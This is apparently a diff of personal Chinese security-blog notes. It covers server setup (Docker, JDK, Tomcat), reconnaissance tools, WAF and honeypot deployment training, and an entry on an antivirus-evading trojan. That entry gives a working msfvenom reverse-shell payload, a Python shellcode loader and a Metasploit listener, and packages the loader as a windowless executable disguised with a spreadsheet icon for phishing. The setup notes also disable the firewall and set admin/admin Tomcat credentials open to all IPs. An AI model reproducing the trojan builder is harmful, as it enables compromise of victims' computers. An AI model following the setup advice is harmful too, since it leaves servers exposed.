+<h6 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h6><p>-sn   基础主机发现</p>
+<p>-sc  默认脚本</p>
+<p>–script&#x3D;vuln 脚本扫描    脚本路径在&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts</p>
+<p>– ssl-enum-ciphers    ssl版本漏洞</p>
+<p>-pn &#x2F;-p0   无ping扫描</p>
+<h3 id="unzip安装"><a href="#unzip安装" class="headerlink" title="unzip安装"></a>unzip安装</h3><p>sudo wget <a href="http://downloads.sourceforge.net/infozip/unzip552.tar.gz">http://downloads.sourceforge.net/infozip/unzip552.tar.gz</a></p>
+<p>tar -zxvf unzip552.tar.gz</p>
+<p>cd unzip-5.52&#x2F;</p>
+<p>cp unix&#x2F;Makefile .&#x2F;</p>
+<p>make generic</p>
+<p>sudo make install</p>
+<h3 id="redis可视化管理工具"><a href="#redis可视化管理工具" class="headerlink" title="redis可视化管理工具"></a>redis可视化管理工具</h3><p><a href="https://github.com/qishibo/AnotherRedisDesktopManager/releases">https://github.com/qishibo/AnotherRedisDesktopManager/releases</a></p>
+<h3 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h3><h4 id="1-2-安装docker"><a href="#1-2-安装docker" class="headerlink" title="1.2.安装docker"></a>1.2.安装docker</h4><p>安装yum工具</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y yum-utils \</span><br><span class="line">           device-mapper-persistent-data \</span><br><span class="line">           lvm2 --skip-broken</span><br></pre></td></tr></table></figure>
+
+<p>然后更新本地镜像源：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置docker镜像源</span></span><br><span class="line">yum-config-manager \</span><br><span class="line">--add-repo \</span><br><span class="line">https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&#x27;s/download.docker.com/mirrors.aliyun.com\/docker-ce/g&#x27;</span> /etc/yum.repos.d/docker-ce.repo</span><br><span class="line"></span><br><span class="line">yum makecache fast</span><br></pre></td></tr></table></figure>
+
+<p>然后输入命令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y docker-ce</span><br></pre></td></tr></table></figure>
+
+<p>docker-ce为社区免费版本。稍等片刻，docker即可安装成功。</p>
+<h4 id="1-3-启动docker"><a href="#1-3-启动docker" class="headerlink" title="1.3.启动docker"></a>1.3.启动docker</h4><p>Docker应用需要用到各种端口，逐一去修改防火墙设置。非常麻烦，因此建议大家直接关闭防火墙！</p>
+<p>启动docker前，一定要关闭防火墙后！！</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 关闭</span></span><br><span class="line">systemctl stop firewalld</span><br><span class="line"><span class="comment"># 禁止开机启动防火墙</span></span><br><span class="line">systemctl <span class="built_in">disable</span> firewalld</span><br><span class="line"><span class="comment">#查看是否关闭防火墙</span></span><br><span class="line">systemctl status firewalld</span><br></pre></td></tr></table></figure>
+
+<p>通过命令启动docker：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start docker  <span class="comment"># 启动docker服务</span></span><br><span class="line"></span><br><span class="line">systemctl stop docker  <span class="comment"># 停止docker服务</span></span><br><span class="line"></span><br><span class="line">systemctl restart docker  <span class="comment"># 重启docker服务</span></span><br><span class="line"></span><br><span class="line">systemctl status docker    <span class="comment">#查看docker是否启动</span></span><br></pre></td></tr></table></figure>
+
+<p>当出现active（running）时，即为启动成功</p>
+<h4 id="1-4-配置镜像加速"><a href="#1-4-配置镜像加速" class="headerlink" title="1.4.配置镜像加速"></a>1.4.配置镜像加速</h4><p>docker官方镜像仓库网速较差，我们需要设置国内镜像服务：</p>
+<p>参考阿里云的镜像加速文档：<a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors">https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##创建文件夹</span><br><span class="line">sudo mkdir -p /etc/docker</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">##在文件夹内新建一个daemon.json文件</span></span><br><span class="line">sudo <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://akchsmlh.mirror.aliyuncs.com&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="comment">##在文件夹内新建一个daemon.json文件</span></span><br><span class="line"><span class="built_in">touch</span> daemon.json</span><br><span class="line"></span><br><span class="line"><span class="comment">##重新加载文件</span></span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line"></span><br><span class="line"><span class="comment">##重启docker</span></span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
+
+
+
+<p>到此Docker的安装就基本结束了</p>
+<h3 id="vulhub安装"><a href="#vulhub安装" class="headerlink" title="vulhub安装"></a>vulhub安装</h3><p> 启动环境   docker-compose up -d</p>
+<p>关闭环境    docker-compose down</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure>
+
+<h3 id="burpsuite插件"><a href="#burpsuite插件" class="headerlink" title="burpsuite插件"></a>burpsuite插件</h3><h4 id="jsEncrypter"><a href="#jsEncrypter" class="headerlink" title="jsEncrypter"></a>jsEncrypter</h4><blockquote>
+<p>前端加密爆破</p>
+<p><a href="https://github.com/c0ny1/jsEncrypter">https://github.com/c0ny1/jsEncrypter</a></p>
+</blockquote>
+<p>1.下载 phantomjs      </p>
+<p><a href="https://phantomjs.org/download.html">https://phantomjs.org/download.html</a></p>
+<p>2.网站找到js加密方法 下载到phantomjs&#x2F;bin文件夹，模板文件也放到目录下</p>
+<p>3.修改模板文件的引入函数</p>
+<p>4.phantomjs.exe nodejs_server_md5.js</p>
+<p>5.bp插件点连接</p>
+<h3 id="JDK安装"><a href="#JDK安装" class="headerlink" title="JDK安装"></a>JDK安装</h3><p>华为云镜像<a href="https://repo.huaweicloud.com/java/jdk/8u151-b12/">https://repo.huaweicloud.com/java/jdk/8u151-b12/</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /usr/local/java    <span class="comment">#创建java目录</span></span><br><span class="line"><span class="built_in">cd</span> /usr/local/java</span><br><span class="line">tar -zxvf jdk-8u151-linux-x64.tar.gz</span><br><span class="line"></span><br><span class="line">vim /etc/profile    <span class="comment">#配置环境变量</span></span><br><span class="line"></span><br><span class="line">  JAVA_HOME=/usr/local/java/jdk1.8.0_151</span><br><span class="line">  CLASSPATH=.:<span class="variable">$JAVA_HOME</span>/lib/tools.jar</span><br><span class="line">  PATH=<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$PATH</span></span><br><span class="line">  <span class="built_in">export</span> PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/:/opt/jvm/jdk1.8.0_151/bin:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="tomcat安装"><a href="#tomcat安装" class="headerlink" title="tomcat安装"></a>tomcat安装</h3><p><a href="https://dlcdn.apache.org/tomcat/tomcat-8/v8.5.87/bin/apache-tomcat-8.5.87.tar.gz">https://dlcdn.apache.org/tomcat/tomcat-8/v8.5.87/bin/apache-tomcat-8.5.87.tar.gz</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/local/tomcat</span><br><span class="line">tar -xzvf apache-tomcat-8.5.87.tar.gz  <span class="comment">#解压</span></span><br><span class="line">vi /etc/profile <span class="comment">#编辑环境变量</span></span><br><span class="line">  	<span class="built_in">export</span> TOMCAT_HOME=/usr/local/tomcat/apache-tomcat-8.5.87</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"><span class="built_in">cd</span> /usr/local/tomcat/apache-tomcat-8.5.87/conf <span class="comment">#修改tomcat端口，避免冲突</span></span><br><span class="line">vim server.xml</span><br><span class="line">	&lt;Connector port=<span class="string">&quot;8888&quot;</span> protocol=<span class="string">&quot;HTTP/1.1&quot;</span> connectionTimeout=<span class="string">&quot;20000&quot;</span> redirectPort=<span class="string">&quot;8443&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /usr/local/tomcat/apache-tomcat-8.5.87/bin</span><br><span class="line">sh startup.sh</span><br></pre></td></tr></table></figure>
+
+<p>设置所有ip可访问</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /webapps/host-manager/META-INF/</span><br><span class="line">vi context.xml</span><br><span class="line">		<span class="comment"># 将allow值改成：&quot;^.*$&quot;   (^.*$ 代表所有IP可访问)</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>访问tomcat页面Server Status,Manager APP,Host Manager报错 403(拒绝访问权限问题)。</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/local/tomcat/apache-tomcat-8.5.87/conf</span><br><span class="line">vim tomcat-users.xml</span><br><span class="line">   &lt;!--tomcat 首页授权登录账号密码配置 --&gt;</span><br><span class="line">    &lt;role rolename=<span class="string">&quot;admin-gui&quot;</span>/&gt;</span><br><span class="line">    &lt;role rolename=<span class="string">&quot;manager-gui&quot;</span>/&gt;</span><br><span class="line">    &lt;role rolename=<span class="string">&quot;manager-script&quot;</span>/&gt;</span><br><span class="line">    &lt;user username=<span class="string">&quot;admin&quot;</span> password=<span class="string">&quot;admin&quot;</span> roles=<span class="string">&quot;admin-gui,manager-gui,manager-script&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>服务器</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>打点</title>
+    <url>/2023/07/14/%E6%89%93%E7%82%B9/</url>
+    <content><![CDATA[<p>oneforall  配置好api  github下载</p>
+<p>子域名挖掘机5.0，可以多级域名  补充oneforall</p>
+<p>魔改版灯塔，普通版本的字典太小</p>
+<p>hunter 鹰图 （可以看到备案       去重，一年内</p>
+<p>0.zone 零零信安</p>
+<p>google语法   exploit-db.com&#x2F;google-hacking-database     intitle:index.of “parent directory”</p>
+<p>微信小程序   各种口语化词汇都可以    xx旗下  xx公司集团   </p>
+<p>站长之家–备案查询</p>
+<p>网站截图工具EyeWitness</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>免杀马</title>
+    <url>/2023/07/08/%E6%9C%A8%E9%A9%AC/</url>
+    <content><![CDATA[<p>生成木马</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.124.53 LPORT=2333 -f py</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 192.168.151.171 2333</span></span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51&quot;</span></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">PAGE_EXECUTE_READWRITE = <span class="number">0x00000040</span>  <span class="comment"># 参数设定</span></span><br><span class="line">VIRTUAL_MEM = (<span class="number">0x1000</span> | <span class="number">0x2000</span>)  <span class="comment"># 参数设定</span></span><br><span class="line">buf_arr = <span class="built_in">bytearray</span>(buf)  <span class="comment"># shellcode变为一个新的字节数组</span></span><br><span class="line">buf_size = <span class="built_in">len</span>(buf_arr)  <span class="comment"># 计算shellcode的大小</span></span><br><span class="line">kernel32 = ctypes.cdll.LoadLibrary(<span class="string">&quot;kernel32.dll&quot;</span>)  <span class="comment"># 调用kernel32.d11</span></span><br><span class="line">kernel32.VirtualAlloc.restype = ctypes.c_uint64  <span class="comment"># 返回类型为c_uint64sc</span></span><br><span class="line">sc_ptr = kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(buf_size), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)</span><br><span class="line">buf_ptr = (ctypes.c_char * buf_size).from_buffer(buf_arr)  <span class="comment"># 将shellcode指向指针</span></span><br><span class="line"><span class="comment"># print(sc_ptm)</span></span><br><span class="line"><span class="comment"># #print(buf_ptr)</span></span><br><span class="line">kernel32.RtlMoveMemory(ctypes.c_uint64(sc_ptr), buf_ptr, ctypes.c_int(buf_size))  <span class="comment"># 调用dll,指向shellcode</span></span><br><span class="line"></span><br><span class="line">handle = kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="number">0</span>), ctypes.c_uint64(sc_ptr), ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                               ctypes.c_int(<span class="number">0</span>), ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line">kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-<span class="number">1</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>打包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyinstaller -F fish.py --icon=&quot;xlsx.ico&quot; -w</span><br></pre></td></tr></table></figure>
+
+<p>-w 程序运行不显示窗口</p>
+<p>–icon是图标</p>
+<p>msf开启监听</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole -q</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.151.171    </span><br><span class="line">set lport 2333</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
 ]]></content>
+  </entry>
+  <entry>
+    <title>安全设备培训</title>
+    <url>/2023/07/18/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E5%9F%B9%E8%AE%AD/</url>
+    <content><![CDATA[<h1 id="雷池——WAF"><a href="#雷池——WAF" class="headerlink" title="雷池——WAF"></a>雷池——WAF</h1><h2 id="waf部署模式"><a href="#waf部署模式" class="headerlink" title="waf部署模式"></a>waf部署模式</h2><h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p>适合客户</p>
+<p>修改其他设备的难度比较小的客户</p>
+<p>业务没有要求必须获取socket为源ip</p>
+<p>业务没有突增需求</p>
+<p>业务可以接受改变现有网络拓扑</p>
+<h4 id="模式特性"><a href="#模式特性" class="headerlink" title="模式特性"></a>模式特性</h4><p>需要调整网络拓扑之后，流量才能到waf<br>支持SSL证书卸载<br>支持定制拦截页面<br>支持bot防护<br>支持链路聚合&amp;vlan<br>改变源IP&amp;源端口&amp;源mac<br>不支持链路的硬件bypass，设备宕机后需要前端有http健康检查机制切流量</p>
+<h3 id="路由代理"><a href="#路由代理" class="headerlink" title="路由代理"></a>路由代理</h3><ul>
+<li><p>基本和反向代理一致</p>
+</li>
+<li><p>希望通过反向代理进行请求检测，而业务服务器需要直接从socket拿到客户端IP;</p>
+</li>
+<li><p>客户有F5，F5按mac地址回源</p>
+</li>
+<li><p>改变源端口&amp;源mac</p>
+</li>
+</ul>
+<h4 id="模式特性-1"><a href="#模式特性-1" class="headerlink" title="模式特性"></a>模式特性</h4><ul>
+<li>和反代基本一致</li>
+<li>支持回源使用客户端真实IP</li>
+<li>一般需要配合F5使用，F5启用auto last hop功能</li>
+</ul>
+<h3 id="透明代理"><a href="#透明代理" class="headerlink" title="透明代理"></a>透明代理</h3><blockquote>
+<p>工作在七层</p>
+</blockquote>
+<ul>
+<li><p>要求不改变现有网络拓扑</p>
+</li>
+<li><p>要求检测HTTPS流量;</p>
+</li>
+</ul>
+<h4 id="模式特性-2"><a href="#模式特性-2" class="headerlink" title="模式特性"></a>模式特性</h4><ul>
+<li>不改变现有网络拓</li>
+<li>客户端和雷池建立握手，雷池使用客户端的IP作为源IP跟WEB Server建立TCP连接，对WEB2.Server完全透明;</li>
+<li>雷池WAF作为中间人的角色，支持SSL证书卸载;</li>
+<li>支持返回指定拦截页面</li>
+<li>支持链路聚合&#x2F;vlan</li>
+<li>改变源端口（随机端口）</li>
+<li>支持链路的硬件bypass (需要硬件支持)</li>
+<li><strong>区分</strong>IN流量和OUT流量（进出口不能接反）</li>
+<li>支持bot防护</li>
+</ul>
+<h3 id="透明桥"><a href="#透明桥" class="headerlink" title="透明桥"></a>透明桥</h3><blockquote>
+<p> 网络层工作</p>
+</blockquote>
+<p>适用客户:</p>
+<ul>
+<li><p>要求不改变现有网络拓扑</p>
+</li>
+<li><p>有VLAN并且是单层VLAN</p>
+</li>
+<li><p>不要求检测HTTPS流量</p>
+</li>
+<li><p>要求对全部HTTP流量进行检测</p>
+</li>
+<li><p>不要求攻击拦截页面</p>
+</li>
+</ul>
+<h4 id="模式特性-3"><a href="#模式特性-3" class="headerlink" title="模式特性"></a>模式特性</h4><ul>
+<li><p>不改变现有网络拓扑</p>
+</li>
+<li><p>不改变源IP&amp;源mac&amp;源端口等</p>
+</li>
+<li><p>客户端和Web Server建立TCP</p>
+</li>
+<li><p>不支持SSL证书卸载，对非HTTP报文不检测直接放行</p>
+</li>
+<li><p>使用发送TCPReset报文或丢包的方式拦截攻击，不支持拦截页面</p>
+</li>
+<li><p>支持多进多出，链路聚合模式下雷池前后端设备协商聚合模式</p>
+</li>
+<li><p>支持链路的硬件bypass(需硬件支持)</p>
+</li>
+<li><p><strong>不区分</strong>IN流量&#x2F;OUT流量</p>
+</li>
+<li><p>服务器响应检测不能做阻断</p>
+</li>
+</ul>
+<h3 id="流量镜像"><a href="#流量镜像" class="headerlink" title="流量镜像"></a>流量镜像</h3><h4 id="适用客户"><a href="#适用客户" class="headerlink" title="适用客户"></a>适用客户</h4><ul>
+<li>要求不改变网络拓扑和网络架构;</li>
+<li>要求只对HTTP流量</li>
+<li>不做阻断或不考虑阻断成功率</li>
+<li>交换机支持镜像</li>
+</ul>
+<h4 id="模式特性-4"><a href="#模式特性-4" class="headerlink" title="模式特性"></a>模式特性</h4><ul>
+<li>不原有网络拓扑</li>
+<li>不支持https流量检测</li>
+<li>但阻断成功率跟环境有一定关系;支持发送Rest来实现拦截模式，</li>
+<li>不支持阻断拦截页面</li>
+<li>要求交换机支持镜像功能</li>
+</ul>
+<h3 id="嵌入式"><a href="#嵌入式" class="headerlink" title="嵌入式"></a>嵌入式</h3><p>适用客户</p>
+<ul>
+<li>要求不改变网络拓扑和网络架构 :</li>
+<li>已经有nginx，且可以在nginx加模块nginx</li>
+<li>如果加载第三方非开源模块，能够提供模块源码</li>
+</ul>
+<p>模式特性<br>不改原有网络拓扑<br>支持https流量检测</p>
+<p>需要在客户nainx上加载t1k模块;</p>
+<h2 id="部署前-信息收集"><a href="#部署前-信息收集" class="headerlink" title="部署前-信息收集"></a>部署前-信息收集</h2><ol>
+<li>确定客户网络拓扑，了解客户网络中流量走向</li>
+<li>流量中是否有HITPS流量</li>
+<li>确定业务QPS、CPS的峰值</li>
+<li>根据拓扑等确定部署模式</li>
+<li>确定硬件雷池物理网卡类型:千兆电、千兆光、万兆光，是否bypass </li>
+<li>根据以上信息和datasheet选适当的型号&#x2F;软件机器配置</li>
+</ol>
+<h2 id="部署中-WAF调优"><a href="#部署中-WAF调优" class="headerlink" title="部署中-WAF调优"></a>部署中-WAF调优</h2><h3 id="日志的分析与处理"><a href="#日志的分析与处理" class="headerlink" title="日志的分析与处理"></a>日志的分析与处理</h3><p>1.日志分类</p>
+<p>攻击检测日志</p>
+<p>频率控制日志</p>
+<p>扩展插件日志</p>
+<h3 id="策略调优原则"><a href="#策略调优原则" class="headerlink" title="策略调优原则"></a>策略调优原则</h3><p><strong>保证设备性能</strong></p>
+<p>设备性能是拦截效果的基础，设备性能太拉胯，一切调优都白搭</p>
+<p><strong>保证业务正常</strong></p>
+<p>在不阻断正常业务情况下，最大化阻断攻击请求</p>
+<p><strong>保证信息准确</strong></p>
+<p>记录到的日志等完整，准确。</p>
+<h3 id="系统配置相关"><a href="#系统配置相关" class="headerlink" title="系统配置相关"></a>系统配置相关</h3><p><strong>基础配置</strong></p>
+<ol>
+<li>服务器时间一定要准确</li>
+<li>syslog等告警尽量配置</li>
+<li>如果有配置高可用，确认配置同步正常</li>
+<li>patch及时打上&#x2F;引擎及时更新</li>
+</ol>
+<p><strong>站点配置</strong></p>
+<ol>
+<li>IP获取方式一定要准确</li>
+<li>记录访问日志，以便事后分析</li>
+</ol>
+<p><strong>常见攻击及漏洞自测</strong></p>
+<ol>
+<li>无害的常见攻击样例对配置好的WAF进行测试，查看系统是否能正常拦截并记录日志，分析误报和漏报情况。</li>
+<li>对漏洞进行扫描(推荐免费的工具:xrav)，检查系统和WAF对漏洞的防御情况。</li>
+<li>雷池支持一些针对特定的框架、组件、服务的攻击检测</li>
+</ol>
+<p><strong>日志的分析与处理</strong></p>
+<p>日志筛选能力</p>
+<ul>
+<li>以攻击检测日志为例:可从多个维度筛选 (ID、事件ID、国家和地区、省份、协议、来源IP、目的端口、域名、URL路径、攻击类型、风险等级、动作、时间等)，并根据字段的不同可选择不同的筛选方式，如“包含”“不包含”、“”、等于”、“属于网段”等，普通筛选的多个筛选条件间是“与”的关系。</li>
+</ul>
+<p>也可以进行基于es语句高级筛选</p>
+<p><strong>漏报拦截</strong></p>
+<p>确定有漏报，需要拦截</p>
+<p>需要拦截指定可能存在隐患的请求如<a href="http://www.aaa.com/api/userlist?id=%E5%AD%98%E5%9C%A8%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%EF%BC%8Cwaf%E9%BB%98%E8%AE%A4%E7%AD%96%E7%95%A5%E4%B8%8D%E8%83%BD%E5%81%9A%E9%98%B2%E6%8A%A4%E7%9A%84">http://www.aaa.com/api/userlist?id=存在逻辑漏洞，waf默认策略不能做防护的</a></p>
+<p>鼠标放到对应匹配项上边,可以显示该匹配项的解释如果不了解uri会匹配到啥，可以放上去看看解释</p>
+<p><strong>误报消除</strong></p>
+<p><strong>确认漏报误报</strong></p>
+<p><strong>漏报</strong><br>多方研判：如果客户现场部署了多种设备，比如IPS，DS等安全设备，可以根据其他日志做综合分析<br>根据waf上的访问日志：疑似非客户正常业务，经客户确认<br>0day：如果爆发0day，且已知请求payload<br><strong>误报</strong><br>经客户确认误报：客户反馈有正常业务被拦截<br>疑似正常业务：通过检测日志研判可能是客户正常业务，经客户确认正常业务的</p>
+<p>白名单：客户在做漏洞扫描，需要放行特定IP&#x2F;业务</p>
+<h4 id="防护设置-规则"><a href="#防护设置-规则" class="headerlink" title="防护设置-规则"></a>防护设置-规则</h4><p>自定义规则调优的两个方向</p>
+<ul>
+<li>​	降误报:如若业务本身有传]S、传Java、PHP序列化数据 ，以及传某种特定的SOL的完整语句等情况。可通过修改引擎模块配置或通过自定义规则加白来解决。</li>
+<li>​	降漏报:通常为因地制宜的解决未支持的识别的CVE漏洞(有的漏洞利用方式不太好设定一个通用的规则去防护)，以及过于宽松的防护设置。</li>
+</ul>
+<p>根据实际应用场景来添加一些适用的规则时应考虑</p>
+<ol>
+<li>该规则在当前业务下是否容易误报，若容易误报则只开观察模式。</li>
+<li>仅添加匹配业务类型的规则，减少过多规则造成的性能损耗。</li>
+</ol>
+<h4 id="防护设置-引擎"><a href="#防护设置-引擎" class="headerlink" title="防护设置-引擎"></a>防护设置-引擎</h4><p>基础的误报调优</p>
+<ol>
+<li>XSS、SQL注入攻击了解的业务情况，调整“非注入型攻击”配置，避免误报</li>
+<li>判断是否有允许的机器人类型，可进行对应的配置，避免误报</li>
+</ol>
+<p>通常发现和溯源会有得分，所以建议开启如下配置</p>
+<ol>
+<li>关闭的检测模块可以打开，设置为只记录日志。</li>
+<li>已开启的模块日志记录闯值调低。</li>
+<li>打开HTTP响应处理</li>
+</ol>
+<h4 id="防护设置示例-规则之webshell"><a href="#防护设置示例-规则之webshell" class="headerlink" title="防护设置示例-规则之webshell"></a>防护设置示例-规则之webshell</h4><p>冰蝎示例</p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230718152247242.png" alt="image-20230718152247242"></p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230718152322817.png" alt="image-20230718152322817"></p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230718152337597.png" alt="image-20230718152337597"></p>
+<h4 id="防护设置示例-放行特定请求"><a href="#防护设置示例-放行特定请求" class="headerlink" title="防护设置示例-放行特定请求"></a>防护设置示例-放行特定请求</h4><p>放行特定的ip</p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230718152533627.png" alt="image-20230718152533627"></p>
+<h4 id="防护设置-访问频率控制"><a href="#防护设置-访问频率控制" class="headerlink" title="防护设置-访问频率控制"></a>防护设置-访问频率控制</h4><p>防止爆破</p>
+<h4 id="高级防护设置"><a href="#高级防护设置" class="headerlink" title="高级防护设置"></a>高级防护设置</h4><p>1、配置主动的机器人检测，进行]S challenge或 滑块校验等方式<br>2、有人在进行目录爆破，高频返回404。此时可通过编写程序的方式来进行统计识别。雷池提供现成的插件，可调整的参数为:</p>
+<ul>
+<li>arg_limit 出现特殊状态码的最大次数</li>
+<li>arg_check_dur 过去几秒内</li>
+<li>arg_status 需要统计的状态码</li>
+</ul>
+<p>3、设置高频攻击进行自动封禁。处理逻辑为:发现某IP在一定时间内进行了N次攻击则进行封禁雷池提供现成的插件进行防护。<br>4、对需重点防护的路径单独统计TOP请求和攻击信息，雷池提供现成的插件进行防护</p>
+<p><strong>OPENAPI</strong></p>
+<p>永不过期，可以二次开发</p>
+<h2 id="演练进行中"><a href="#演练进行中" class="headerlink" title="演练进行中"></a>演练进行中</h2><h3 id="现场值守"><a href="#现场值守" class="headerlink" title="现场值守"></a>现场值守</h3><ol>
+<li><p>信息收集</p>
+<p>关注日志更新，关注威胁情报的更新</p>
+</li>
+<li><p>风险及优先级判断</p>
+<p>根据日志信息，判断攻击行为的严重程度，是否需要即刻处理，是否需要深度分析。根据威胁情报的更新判断WAF是否有对应的调整。</p>
+</li>
+<li><p>深度分析</p>
+<p>对于，可查看日志详情、联系前后行为进行深度分析。对于威胁情报进行深度分析，如IP的攻击行为、新漏洞的影响等。</p>
+</li>
+<li><p>处理</p>
+</li>
+</ol>
+<p>​		对于误报、漏报、新漏洞进行对应的策略调整，对于不明确的攻击行为进行持续的观察。</p>
+<h4 id="滤掉扫描器日志"><a href="#滤掉扫描器日志" class="headerlink" title="滤掉扫描器日志"></a>滤掉扫描器日志</h4><p>扫描器没有隐藏自己的特征，会有很多告警，可在日志筛选处排除掉对应攻击类型</p>
+<h4 id="多设备联动"><a href="#多设备联动" class="headerlink" title="多设备联动"></a>多设备联动</h4><p>waf将攻击请求转发给蜜罐</p>
+<p>waf将日志通过syslog转发给态势感知，态势感知根据多设备综合研判，再通过openapi方式转发给waf做自动封禁，提高封禁效率</p>
+<p>网络管理-网络接口配置-工作组管理-添加一个工作组       可以看到工作模式</p>
+<h1 id="谛听——蜜罐"><a href="#谛听——蜜罐" class="headerlink" title="谛听——蜜罐"></a>谛听——蜜罐</h1><p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230718160326368.png" alt="image-20230718160326368"></p>
+<p>智学习蜜罐，真实业务仿真，热门缺陷系统仿真</p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230718162628160.png" alt="image-20230718162628160"></p>
+<p>策略配置最佳实践</p>
+<h1 id="洞鉴——"><a href="#洞鉴——" class="headerlink" title="洞鉴——"></a>洞鉴——</h1><blockquote>
+<p>硬件和软件两个版本</p>
+</blockquote>
+<p>443&#x2F;80、9558端口（使用辅助工具必须开放此端口）</p>
+<h3 id="常用扫描策略"><a href="#常用扫描策略" class="headerlink" title="常用扫描策略"></a>常用扫描策略</h3><h4 id="降低对业务的影响"><a href="#降低对业务的影响" class="headerlink" title="降低对业务的影响"></a>降低对业务的影响</h4><p>，使用默认策略，默认三小时，3500w分钟以下，syn扫描，connet连接较慢，UA请求头，cookie,url小于3w，站点小于2000，主机小于2000，减少收集最大连接数，关闭模拟浏览器渲染，关闭允许爬父目录，只扫描严重和高危漏洞，可通过标签筛选，hw一般使用原理扫描插件</p>
+<h5 id="提升效率的方法"><a href="#提升效率的方法" class="headerlink" title="提升效率的方法"></a>提升效率的方法</h5><p>高效扫描，增加并发，降低子域名深度</p>
+<p>关闭跳过不存活主机，使用默认端口组扫描，对存在的主机进行全端口扫描</p>
+<p>漏洞详情-漏洞复测</p>
+<h3 id="业务管理功能简介"><a href="#业务管理功能简介" class="headerlink" title="业务管理功能简介"></a>业务管理功能简介</h3><p>资产导入上限   ip1.3w，url1.2w</p>
+<h4 id="漏洞管理"><a href="#漏洞管理" class="headerlink" title="漏洞管理"></a>漏洞管理</h4><p>删除，扫描，复测</p>
+<p>生成任务，漏洞，资产，基线报表，默认模板只会生成漏洞权重大于50%的漏洞</p>
+<p>报表导出，服务2w，端口2000，url3w，漏洞5w</p>
